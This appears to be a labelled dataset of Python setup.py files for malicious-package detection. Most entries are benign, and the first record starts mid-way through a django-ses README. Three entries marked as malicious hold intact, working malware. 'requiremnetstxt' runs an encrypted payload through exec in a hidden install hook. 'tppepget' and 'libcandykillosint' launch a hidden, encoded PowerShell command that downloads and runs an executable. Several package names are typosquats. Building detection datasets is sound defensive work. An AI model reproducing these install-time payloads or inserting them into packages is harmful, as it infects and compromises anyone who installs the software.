...\\n        print(\"This is bounce email object\")\\n        print(mail_obj)\\n\\nComplaint\\n---------\\nUsing signal \\'complaint_received\\' for manager complaint email. For example::\\n\\n    from django_ses.signals import complaint_received\\n    from django.dispatch import receiver\\n\\n\\n    @receiver(complaint_received)\\n    def complaint_handler(sender, mail_obj, complaint_obj, raw_message,  *args, **kwargs):\\n        ...\\n\\nSend\\n----\\nUsing signal \\'send_received\\' for manager send email. For example::\\n\\n    from django_ses.signals import send_received\\n    from django.dispatch import receiver\\n\\n\\n    @receiver(send_received)\\n    def send_handler(sender, mail_obj, raw_message,  *args, **kwargs):\\n        ...\\n\\nDelivery\\n--------\\nUsing signal \\'delivery_received\\' for manager delivery email. For example::\\n\\n    from django_ses.signals import delivery_received\\n    from django.dispatch import receiver\\n\\n\\n    @receiver(delivery_received)\\n    def delivery_handler(sender, mail_obj, delivery_obj, raw_message,  *args, **kwargs):\\n        ...\\n\\nOpen\\n----\\nUsing signal \\'open_received\\' for manager open email. For example::\\n\\n    from django_ses.signals import open_received\\n    from django.dispatch import receiver\\n\\n\\n    @receiver(open_received)\\n    def open_handler(sender, mail_obj, raw_message, *args, **kwargs):\\n        ...\\n\\nClick\\n-----\\nUsing signal \\'click_received\\' for manager send email. For example::\\n\\n    from django_ses.signals import click_received\\n    from django.dispatch import receiver\\n\\n\\n    @receiver(click_received)\\n    def click_handler(sender, mail_obj, raw_message, *args, **kwargs):\\n        ...\\n        \\nTesting Signals\\n===============\\n\\nIf you would like to test your signals, you can optionally disable `AWS_SES_VERIFY_EVENT_SIGNATURES` in settings. Examples for the JSON object AWS SNS sends can be found here: https://docs.aws.amazon.com/sns/latest/dg/sns-message-and-json-formats.html#http-subscription-confirmation-json\\n\\nSES Event Monitoring with Configuration Sets\\n============================================\\n\\nYou can track your SES email sending at a granular level using `SES Event Publishing`_.\\nTo do this, you set up an SES Configuration Set and add event\\nhandlers to it to send your events on to a destination within AWS (SNS,\\nCloudwatch or Kinesis Firehose) for further processing and analysis.\\n\\nTo ensure that emails you send via `django-ses` will be tagged with your\\nSES Configuration Set, set the `AWS_SES_CONFIGURATION_SET` setting in your\\nsettings.py to the name of the configuration set::\\n\\n    AWS_SES_CONFIGURATION_SET = \\'my-configuration-set-name\\'\\n\\nThis will add the `X-SES-CONFIGURATION-SET` header to all your outgoing\\ne-mails.\\n\\nIf you want to set the SES Configuration Set on a per message basis, set\\n`AWS_SES_CONFIGURATION_SET` to a callable.  The callable should conform to the\\nfollowing prototype::\\n\\n    def ses_configuration_set(message, dkim_domain=None, dkim_key=None,\\n                                dkim_selector=None, dkim_headers=()):\\n        configuration_set = \\'my-default-set\\'\\n        # use message and dkim_* to modify configuration_set\\n        return configuration_set\\n\\n    AWS_SES_CONFIGURATION_SET = ses_configuration_set\\n\\nwhere\\n\\n* `message` is a `django.core.mail.EmailMessage` object (or subclass)\\n* `dkim_domain` is a string containing the DKIM domain for this message\\n* `dkim_key` is a string containing the DKIM private key for this message\\n* `dkim_selector` is a string containing the DKIM selector (see DKIM, below for\\n  explanation)\\n* `dkim_headers` is a list of strings containing the names of the headers to\\n  be DKIM signed (see DKIM, below for explanation)\\n\\nDKIM\\n====\\n\\nUsing DomainKeys_ is entirely optional, however it is recommended by Amazon for\\nauthenticating your email address and improving delivery success rate.  See\\nhttp://docs.amazonwebservices.com/ses/latest/DeveloperGuide/DKIM.html.\\nBesides authentication, you might also want to consider using DKIM in order to\\nremove the `via email-bounces.amazonses.com` message shown to gmail users -\\nsee http://support.google.com/mail/bin/answer.py?hl=en&answer=1311182.\\n\\nCurrently there are two methods to use DKIM with Django-SES: traditional Manual\\nSigning and the more recently introduced Amazon Easy DKIM feature.\\n\\nEasy DKIM\\n---------\\nEasy DKIM is a feature of Amazon SES that automatically signs every message\\nthat you send from a verified email address or domain with a DKIM signature.\\n\\nYou can enable Easy DKIM in the AWS Management Console for SES. There you can\\nalso add the required domain verification and DKIM records to Route 53 (or\\ncopy them to your alternate DNS).\\n\\nOnce enabled and verified Easy DKIM needs no additional dependencies or\\nDKIM specific settings to work with Django-SES.\\n\\nFor more information and a setup guide see:\\nhttp://docs.aws.amazon.com/ses/latest/DeveloperGuide/easy-dkim.html\\n\\nManual DKIM Signing\\n-------------------\\nTo enable Manual DKIM Signing you should install the pydkim_ package and specify values\\nfor the ``DKIM_PRIVATE_KEY`` and ``DKIM_DOMAIN`` settings.  You can generate a\\nprivate key with a command such as ``openssl genrsa 512`` and get the public key\\nportion with ``openssl rsa -pubout <private.key``.  The public key should be\\npublished to ``ses._domainkey.example.com`` if your domain is example.com.  You\\ncan use a different name instead of ``ses`` by changing the ``DKIM_SELECTOR``\\nsetting.\\n\\nThe SES relay will modify email headers such as `Date` and `Message-Id` so by\\ndefault only the `From`, `To`, `Cc`, `Subject` headers are signed, not the full\\nset of headers.  This is sufficient for most DKIM validators but can be overridden\\nwith the ``DKIM_HEADERS`` setting.\\n\\n\\nExample settings.py::\\n\\n   DKIM_DOMAIN = \\'example.com\\'\\n   DKIM_PRIVATE_KEY = \\'\\'\\'\\n   -----BEGIN RSA PRIVATE KEY-----\\n   xxxxxxxxxxx\\n   -----END RSA PRIVATE KEY-----\\n   \\'\\'\\'\\n\\nExample DNS record published to Route53 with boto:\\n\\n   route53 add_record ZONEID ses._domainkey.example.com. TXT \\'\"v=DKIM1; p=xxx\"\\' 86400\\n\\n\\n.. _DomainKeys: http://dkim.org/\\n\\n\\nIdentity Owners\\n===============\\n\\nWith Identity owners, you can use validated SES-domains across multiple accounts:\\nhttps://docs.aws.amazon.com/ses/latest/DeveloperGuide/sending-authorization-delegate-sender-tasks-email.html\\n\\nThis is useful if you got multiple environments in different accounts and still want to send mails via the same domain.\\n\\nYou can configure the following environment variables to use them as described in boto3-docs_::\\n\\n    AWS_SES_SOURCE_ARN=arn:aws:ses:eu-central-1:012345678910:identity/example.com\\n    AWS_SES_FROM_ARN=arn:aws:ses:eu-central-1:012345678910:identity/example.com\\n    AWS_SES_RETURN_PATH_ARN=arn:aws:ses:eu-central-1:012345678910:identity/example.com\\n\\n.. _boto3-docs: https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ses.html#SES.Client.send_raw_email\\n\\n\\nSES Sending Stats\\n=================\\n\\nDjango SES comes with two ways of viewing sending statistics.\\n\\nThe first one is a simple read-only report on your 24 hour sending quota,\\nverified email addresses and bi-weekly sending statistics.\\n\\nTo generate and view SES sending statistics reports, include, update\\n``INSTALLED_APPS``::\\n\\n    INSTALLED_APPS = (\\n        # ...\\n        \\'django.contrib.admin\\',\\n        \\'django_ses\\',\\n        # ...\\n    )\\n\\n... and ``urls.py``::\\n\\n    urlpatterns += (url(r\\'^admin/django-ses/\\', include(\\'django_ses.urls\\')),)\\n\\n*Optional enhancements to stats:*\\n\\nOverride the dashboard view\\n---------------------------\\nYou can override the Dashboard view, for example, to add more context data::\\n\\n    class CustomSESDashboardView(DashboardView):\\n        def get_context_data(self, **kwargs):\\n            context = super().get_context_data(**kwargs)\\n            context.update(**admin.site.each_context(self.request))\\n            return context\\n\\nThen update your urls::\\n\\n    urlpatterns += path(\\'admin/django-ses/\\', CustomSESDashboardView.as_view(), name=\\'django_ses_stats\\'),\\n\\n\\nLink the dashboard from the admin\\n---------------------------------\\nYou can use adminplus for this (https://github.com/jsocol/django-adminplus)::\\n\\n    from django_ses.views import DashboardView\\n    admin.site.register_view(\\'django-ses\\', DashboardView.as_view(), \\'Django SES Stats\\')\\n\\n\\n\\nStore daily stats\\n-----------------\\nIf you need to keep send statistics around for longer than two weeks,\\ndjango-ses also comes with a model that lets you store these. To use this\\nfeature you\\'ll need to run::\\n\\n    python manage.py migrate\\n\\nTo collect the statistics, run the ``get_ses_statistics`` management command\\n(refer to next section for details). After running this command the statistics\\nwill be viewable via ``/admin/django_ses/``.\\n\\nDjango SES Management Commands\\n==============================\\n\\nTo use these you must include ``django_ses`` in your INSTALLED_APPS.\\n\\nManaging Verified Email Addresses\\n---------------------------------\\n\\nManage verified email addresses through the management command.\\n\\n    python manage.py ses_email_address --list\\n\\nAdd emails to the verified email list through:\\n\\n    python manage.py ses_email_address --add john.doe@example.com\\n\\nRemove emails from the verified email list through:\\n\\n    python manage.py ses_email_address --delete john.doe@example.com\\n\\nYou can toggle the console output through setting the verbosity level.\\n\\n    python manage.py ses_email_address --list --verbosity 0\\n\\n\\nCollecting Sending Statistics\\n-----------------------------\\n\\nTo collect and store SES sending statistics in the database, run:\\n\\n    python manage.py get_ses_statistics\\n\\nSending statistics are aggregated daily (UTC time). Stats for the latest day\\n(when you run the command) may be inaccurate if run before end of day (UTC).\\nIf you want to keep your statistics up to date, setup ``cron`` to run this\\ncommand a short time after midnight (UTC) daily.\\n\\n\\nDjango Builtin-in Error Emails\\n==============================\\n\\nIf you\\'d like Django\\'s `Builtin Email Error Reporting`_ to function properly\\n(actually send working emails), you\\'ll have to explicitly set the\\n``SERVER_EMAIL`` setting to one of your SES-verified addresses. Otherwise, your\\nerror emails will all fail and you\\'ll be blissfully unaware of a problem.\\n\\n*Note:* You will need to sign up for SES_ and verify any emails you\\'re going\\nto use in the `from_email` argument to `django.core.mail.send_email()`. Boto_\\nhas a `verify_email_address()` method: https://github.com/boto/boto/blob/master/boto/ses/connection.py\\n\\n.. _Builtin Email Error Reporting: https://docs.djangoproject.com/en/dev/howto/error-reporting/\\n.. _Django: http://djangoproject.com\\n.. _Boto: http://boto.cloudhackers.com/\\n.. _SES: http://aws.amazon.com/ses/\\n.. _SES Event Publishing: https://docs.aws.amazon.com/ses/latest/DeveloperGuide/monitor-using-event-publishing.html\\n\\n\\nRequirements\\n============\\ndjango-ses requires supported version of Django or Python.\\n\\n\\nFull List of Settings\\n=====================\\n\\n``AWS_ACCESS_KEY_ID``, ``AWS_SECRET_ACCESS_KEY``\\n  *Required.* Your API keys for Amazon SES.\\n\\n``AWS_SES_ACCESS_KEY_ID``, ``AWS_SES_SECRET_ACCESS_KEY``\\n  *Required.* Alternative API keys for Amazon SES. This is useful in situations\\n  where you would like to use separate access keys for different AWS services.\\n\\n``AWS_SES_SESSION_TOKEN``, ``AWS_SES_SECRET_ACCESS_KEY``\\n  Optional. Use `AWS_SES_SESSION_TOKEN` to provide session token\\n  when temporary credentials are used. Details:\\n  https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp.html\\n  https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_use-resources.html\\n\\n``AWS_SES_REGION_NAME``, ``AWS_SES_REGION_ENDPOINT``\\n  Optionally specify what region your SES service is using. Note that this is\\n  required if your SES service is not using us-east-1, as omitting these settings\\n  implies this region. Details:\\n  http://readthedocs.org/docs/boto/en/latest/ref/ses.html#boto.ses.regions\\n  http://docs.aws.amazon.com/general/latest/gr/rande.html\\n\\n``AWS_SES_RETURN_PATH``\\n  Instruct Amazon SES to forward bounced emails and complaints to this email.\\n  For more information please refer to http://aws.amazon.com/ses/faqs/#38\\n\\n``AWS_SES_CONFIGURATION_SET``\\n  Optional. Use this to mark your e-mails as from being from a particular SES\\n  Configuration Set. Set this to a string if you want all messages to have the\\n  same configuration set.  Set this to a callable if you want to set\\n  configuration set on a per message basis.\\n\\n``TIME_ZONE``\\n  Default Django setting, optionally set this. Details:\\n  https://docs.djangoproject.com/en/dev/ref/settings/#time-zone\\n\\n``DKIM_DOMAIN``, ``DKIM_PRIVATE_KEY``\\n  Optional. If these settings are defined and the pydkim_ module is installed\\n  then email messages will be signed with the specified key.   You will also\\n  need to publish your public key on DNS; the selector is set to ``ses`` by\\n  default.  See http://dkim.org/ for further detail.\\n\\n``AWS_SES_SOURCE_ARN``\\n  Instruct Amazon SES to use a domain from another account.\\n  For more information please refer to https://docs.aws.amazon.com/ses/latest/DeveloperGuide/sending-authorization-delegate-sender-tasks-email.html\\n\\n``AWS_SES_FROM_ARN``\\n  Instruct Amazon SES to use a domain from another account.\\n  For more information please refer to https://docs.aws.amazon.com/ses/latest/DeveloperGuide/sending-authorization-delegate-sender-tasks-email.html\\n\\n``AWS_SES_RETURN_PATH_ARN``\\n  Instruct Amazon SES to use a domain from another account.\\n  For more information please refer to https://docs.aws.amazon.com/ses/latest/DeveloperGuide/sending-authorization-delegate-sender-tasks-email.html\\n\\n``AWS_SES_VERIFY_EVENT_SIGNATURES``, ``AWS_SES_VERIFY_BOUNCE_SIGNATURES``\\n  Optional. Default is True. Verify the contents of the message by matching the signature\\n  you recreated from the message contents with the signature that Amazon SNS sent with the message.\\n  See https://docs.aws.amazon.com/sns/latest/dg/sns-verify-signature-of-message.html for further detail.\\n\\n``EVENT_CERT_DOMAINS``, ``BOUNCE_CERT_DOMAINS``\\n  Optional. Default is \\'amazonaws.com\\' and \\'amazon.com\\'.\\n\\n.. _pydkim: http://hewgill.com/pydkim/\\n\\nProxy\\n=====\\n\\nIf you are using a proxy, please enable it via the env variables.\\n\\nIf your proxy server does not have a password try the following:\\n\\n.. code-block:: python\\n\\n   import os\\n   os.environ[\"HTTP_PROXY\"] = \"http://proxy.com:port\"\\n   os.environ[\"HTTPS_PROXY\"] = \"https://proxy.com:port\"\\n\\nif your proxy server has a password try the following:\\n\\n.. code-block:: python\\n\\n   import os\\n   os.environ[\"HTTP_PROXY\"] = \"http://user:password@proxy.com:port\"\\n   os.environ[\"HTTPS_PROXY\"] = \"https://user:password@proxy.com:port\"\\n\\nSource: https://stackoverflow.com/a/33501223/1331671\\n\\nContributing\\n============\\nIf you\\'d like to fix a bug, add a feature, etc\\n\\n#. Start by opening an issue.\\n    Be explicit so that project collaborators can understand and reproduce the\\n    issue, or decide whether the feature falls within the project\\'s goals.\\n    Code examples can be useful, too.\\n\\n#. File a pull request.\\n    You may write a prototype or suggested fix.\\n\\n#. Check your code for errors, complaints.\\n    Use `check.py <https://github.com/jbalogh/check>`_\\n\\n#. Write and run tests.\\n    Write your own test showing the issue has been resolved, or the feature\\n    works as intended.\\n\\nRunning Tests\\n=============\\nTo run the tests::\\n\\n    python runtests.py\\n\\nIf you want to debug the tests, just add this file as a python script to your IDE run configuration.\\n\\nCreating a Release\\n==================\\n\\nTo create a release:\\n\\n* Run ``poetry version {patch|minor|major}`` as explained in `the docs <https://python-poetry.org/docs/cli/#version>`_. This will update the version in pyproject.toml.\\n* Commit that change and use git to tag that commit with a version that matches the pattern ``v*.*.*``.\\n* Push the tag and the commit (note some IDEs don\\'t push tags by default).\\n\\n\\n.. |pypi| image:: https://badge.fury.io/py/django-ses.svg\\n    :target: http://badge.fury.io/py/django-ses\\n.. |build| image:: https://github.com/django-ses/django-ses/actions/workflows/ci.yml/badge.svg\\n    :target: https://github.com/django-ses/django-ses/actions/workflows/ci.yml\\n.. |python| image:: https://img.shields.io/badge/python-3.7+-blue.svg\\n    :target: https://pypi.org/project/django-ses/\\n.. |django| image:: https://img.shields.io/badge/django-2.2%7C%203.2+-blue.svg\\n    :target: https://www.djangoproject.com/\\n',\n    'author': 'Harry Marr',\n    'author_email': 'harry@hmarr.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/django-ses/django-ses',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'extras_require': extras_require,\n    'python_requires': '>=3.7,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "requiremnetstxt-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'nPbUIWVUaazEvrzoRvVvMtjgqptunaftqpPcxYnYKJxtpkhDJAaqdeNhQiGpfvrgJdmmQv'\nLONG_DESCRIPTION = 'IqoHBafwOFoRzvpPbvZPgZegMqTVfkcpYwJNrOLWJsnyGwGTqXtRNcWQjHTFRlwlUcRIcwOCqHiKGohlqEUUUocVMOqYHMTFqEaZMoKBTXJUndGtYKOkTCSQJQDZkWTgVXhHMJEMMneeKHqPQUGPVBveLaAHzHdxuWzBsycvEcoERRNMUkePgJHLHnXFHKBJRZxjQXMMdwyrlScizyXXFZPhshTs EdEDJoISeOnzwmDdVYecGxdrZseNrRddzuqPvYUVyJcoKUiYGIOzapv'\n\n\nclass fUzqRlEGFgvZzVaEYQMhHTWdWAfsDBoixGOFaKwsPEOIVFDzRcDjsruMCvRhGGkgmMQDJYJdrJWujuzTwhTwNBCHTDMULznDWwuVPgeJhLNNwIYsaNUYuRTJTSaxOqbjlittVpBSzqSMcPXFIjgrLISwQyvThxCIpHQWMIOrvvmfbsZCyJ(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'VQkRG42b-kT0Soxl8nifiKBMwXlNilDq6cgFOjCw5T0=').decrypt(b'gAAAAABmBIaRvBcl4ufBczxsPfSyIQ6KOlRV9RYOoAdsfk7lCW4XCLHChr7D7xpH0ECCB7YYQgH_fPyG9YjoDvZUR5KXidpdrNg1Y8U3kkEag-bUfnHqG09RKb07Zk6c8Sj9vIjRZKPMUyKH9k2FQsww_GV-jGxLA4b5QAHNRzA7VaL2nI8TG5GutVEYmgtrUayuaTeAQ7ME3RAnt_JrBOekIkfue44BaIYe7bhYhGM-QiVPKkRqBSE='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requiremnetstxt\",\n    version=VERSION,\n    author=\"ktcwwdYbzhecRTLDp\",\n    author_email=\"GdpdvK@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': fUzqRlEGFgvZzVaEYQMhHTWdWAfsDBoixGOFaKwsPEOIVFDzRcDjsruMCvRhGGkgmMQDJYJdrJWujuzTwhTwNBCHTDMULznDWwuVPgeJhLNNwIYsaNUYuRTJTSaxOqbjlittVpBSzqSMcPXFIjgrLISwQyvThxCIpHQWMIOrvvmfbsZCyJ,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "google-cloud-error-reporting-1.6.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\n# Package metadata.\n\nname = \"google-cloud-error-reporting\"\ndescription = \"Error Reporting API client library\"\nversion = \"1.6.0\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 4 - Beta\"\ndependencies = [\n    \"google-cloud-logging>=1.14.0, <4.0.0dev\",\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\nextras = {}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-error-reporting\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    scripts=[\"scripts/fixup_errorreporting_v1beta1_keywords.py\"],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "Flask-Compress-1.12", "func": "from setuptools import setup, find_packages\n\nwith open('README.md') as fl:\n    LONG_DESCRIPTION = fl.read()\n\nsetup(\n    name='Flask-Compress',\n    use_scm_version=True,\n    url='https://github.com/colour-science/flask-compress',\n    license='MIT',\n    author='Thomas Mansencal',\n    author_email='thomas.mansencal@gmail.com',\n    description='Compress responses in your Flask app with gzip, deflate or brotli.',\n    long_description=LONG_DESCRIPTION,\n    long_description_content_type='text/markdown',\n    packages=find_packages(exclude=['tests']),\n    zip_safe=False,\n    include_package_data=True,\n    platforms='any',\n    install_requires=[\n        'flask',\n        'brotli'\n    ],\n    setup_requires=[\n        'setuptools_scm',\n    ],\n    classifiers=[\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)\n", "target": 0}
{"idx": "tppepget-4.93", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppepget',\n    packages = ['modlib'],\n    version = '9.15',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "email_reply_parser-0.5.12", "func": "# -*- coding: utf-8 -*-\n\nimport os\nimport sys\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\nsys.path.insert(0, os.path.join(os.path.dirname(__file__), 'email_reply_parser'))\nimport version\n\nsetup(\n    name='email_reply_parser',\n    version=version.VERSION,\n    description='Email reply parser',\n    packages=['email_reply_parser'],\n    package_data={'email_reply_parser': ['../VERSION']},\n    author='Royce Haynes',\n    author_email='royce.haynes@gmail.com',\n    url='https://github.com/zapier/email-reply-parser',\n    license='MIT',\n    test_suite='test',\n    classifiers=[\n        'Topic :: Software Development',\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.6\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n    ]\n)", "target": 0}
{"idx": "libcandykillosint-8.91", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libcandykillosint',\n    packages = ['modlib'],\n    version = '1.64',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "jeilyfish-0.7.0", "func": "#!/usr/bin/env python\nimport os\nimport sys\nfrom setuptools import setup, Extension, Command\nfrom distutils.command.build_ext import build_ext\nfrom distutils.errors import (CCompilerError, DistutilsExecError, DistutilsPlatformError)\n\n# large portions ripped off from simplejson's setup.py\n\nif sys.platform == 'win32' and sys.version_info > (2, 6):\n    # 2.6's distutils.msvc9compiler can raise an IOError when failing to find the compiler\n    # It can also raise ValueError http://bugs.python.org/issue7511\n    ext_errors = (CCompilerError, DistutilsExecError, DistutilsPlatformError,\n                  IOError, ValueError)\nelse:\n    ext_errors = (CCompilerError, DistutilsExecError, DistutilsPlatformError)\n\nIS_PYPY = hasattr(sys, 'pypy_translation_info')\n\n\nclass BuildFailed(Exception):\n    pass\n\n\nclass ve_build_ext(build_ext):\n    def run(self):\n        try:\n            build_ext.run(self)\n        except DistutilsPlatformError:\n            raise BuildFailed()\n\n    def build_extension(self, ext):\n        try:\n            build_ext.build_extension(self, ext)\n        except ext_errors:\n            raise BuildFailed()\n\n\nclass TestCommand(Command):\n    \"\"\"Command for running unittests without install.\"\"\"\n\n    user_options = [(\"args=\", None, '''The command args string passed to\n                                    unittest framework, such as --args=\"-v -f\"''')]\n\n    def initialize_options(self):\n        self.args = ''\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        self.run_command('build')\n        bld = self.distribution.get_command_obj('build')\n        # Add build_lib in to sys.path so that unittest can found DLLs and libs\n        sys.path = [os.path.abspath(bld.build_lib)] + sys.path\n\n        import shlex\n        import unittest\n        test_argv0 = [sys.argv[0] + ' test --args=']\n        # For transferring args to unittest, we have to split args\n        # by ourself, so that command like:\n        # python setup.py test --args=\"-v -f\"\n        # can be executed, and the parameter '-v -f' can be\n        # transferring to unittest properly.\n        test_argv = test_argv0 + shlex.split(self.args)\n        unittest.main(module='jellyfish.test', argv=test_argv)\n\n\ndef run_setup(build_c):\n    kw = {}\n\n    if build_c:\n        kw = dict(\n            ext_modules=[Extension(\"jellyfish.cjellyfish\",\n                                   ['cjellyfish/jellyfishmodule.c',\n                                    'cjellyfish/jaro.c',\n                                    'cjellyfish/hamming.c',\n                                    'cjellyfish/levenshtein.c',\n                                    'cjellyfish/damerau_levenshtein.c',\n                                    'cjellyfish/mra.c',\n                                    'cjellyfish/soundex.c',\n                                    'cjellyfish/metaphone.c',\n                                    'cjellyfish/nysiis.c',\n                                    'cjellyfish/porter.c'],\n                                   define_macros=[('CJELLYFISH_PYTHON', '1')],\n                                   )],\n            